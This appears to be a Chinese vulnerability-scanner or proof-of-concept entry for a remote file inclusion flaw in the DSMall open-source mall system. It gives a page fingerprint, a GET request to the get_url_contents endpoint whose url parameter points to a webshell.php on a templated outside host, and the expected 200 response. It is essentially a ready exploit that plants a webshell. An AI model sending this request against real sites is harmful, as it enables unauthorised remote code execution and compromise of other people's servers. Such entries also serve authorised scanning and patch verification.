# DSMall开源多用户商城系统get_url_contents存在远程文件包含漏洞

DSMall ｜ 文件包含 ｜ —
- **指纹**：`body="var HOMESITEURL"`
- **请求**：`GET /public/home/Connectwx/get_url_contents/?url=http://{{temp_dns}}/webshell.php HTTP/1.1`
- **响应特征**：200